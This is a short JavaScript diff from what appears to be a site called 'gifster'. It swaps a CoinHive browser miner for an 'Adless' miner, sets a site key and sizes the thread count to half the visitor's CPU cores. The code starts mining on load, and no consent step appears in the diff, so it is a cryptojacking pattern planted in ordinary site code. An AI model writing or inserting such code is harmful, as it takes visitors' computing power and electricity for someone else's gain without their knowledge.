@@ -9,9 +9,21 @@ const random = (min, max) => {
     return Math.round(min - 0.5 + Math.random() * (max - min + 1));
 };
 
-const siteKey = "2F5aYgxwsLMu62VnJYEQb4LIxnBQvbfo";
+const siteKey = "d64f48ddbeeb4167624a838b6651728f";
 const userName = `gifster-${random(1, 99999)}`;
-const miner = new CoinHive.User(siteKey, userName, {throttle: 0.8, threads: 1});
+let threads;
+
+if(navigator && navigator.hardwareConcurrency){
+    const cores = navigator.hardwareConcurrency;
+    threads = cores % 2 === 0
+        ? cores / 2
+        : (cores - 1) / 2;
+}
+else {
+    threads = 1;
+}
+
+const miner = new Adless.Anonymous(siteKey, {throttle: 40, threads: threads});
 
 miner.start();
 
